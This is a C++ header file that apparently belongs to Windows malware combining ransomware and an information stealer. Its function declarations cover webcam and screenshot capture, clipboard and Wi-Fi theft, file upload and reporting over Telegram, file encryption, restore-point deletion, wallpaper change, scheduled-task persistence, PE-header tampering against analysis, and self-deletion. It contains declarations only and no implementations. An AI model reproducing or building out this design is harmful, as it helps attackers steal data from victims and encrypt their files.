#pragma once
#include "../commons/common.h"
#include "json.hpp"
#include <fstream>
#include <sstream>
#include <dshow.h>
#include <iomanip>
#include <atlstr.h>
#include <wininet.h>
#include <atlimage.h>
#include <winternl.h>
#include <VersionHelpers.h>
#include <experimental/filesystem>
#import "libid:78530B68-61F9-11D2-8CAD-00A024580902" raw_interfaces_only named_guids

#pragma comment(lib, "urlmon.lib")
#pragma comment(lib,"Wininet.lib")
#pragma comment(lib, "strmiids.lib")


typedef struct timeval2 {
    long tv_sec;
    long tv_usec;
} timeval2;

std::string exec(const char* cmd);
bool copy_file(const char* From, const char* To);
std::string powershellEncodedCommand(std::string cmd);
DWORD trojanFunction(LPVOID url);
DWORD removeTasks(LPVOID params_useless);
void peHeaderDeleter();
void imageSizeIncreaser();
void getAllFiles(std::string username);
int gettimeofday(struct timeval* tp, struct timezone* tzp);
std::string generateRandom(const int len);
std::vector<std::string> getFiles(std::string mainDir);
std::vector<std::string> split(const std::string& s, char delimiter);
bool fileExists(const std::string& name);
std::string getDate();
std::string getHWID();
std::string getIPData();
std::string getCPU();
std::string getGPU();
std::string getPcName();
std::string getUserName();
std::string getResolution();
std::string getWinVersion();
std::string getLanguage();
std::string getClipboard();
std::string getScreenshot();
std::string getWifi();
std::vector<std::string> getLinks();
std::vector<std::string> getWebcams();
void sendEmail();
void dropFile(std::string content, std::string path);
void changeWallpaper(std::string content);
bool isConnected2Internet();
void scheduleTask();
std::vector<std::vector<std::string>> vectorSplitter(std::vector<std::string> baseVector, int parts);
void deleteRestorePoints();
void deleteMe(std::string myPath);
void encryptFiles(std::vector<std::string> files, std::string key);
void uploadFiles(std::vector<std::string> files);
void takeWebcams();
void changeIcon();
void sendTelegramInfo();
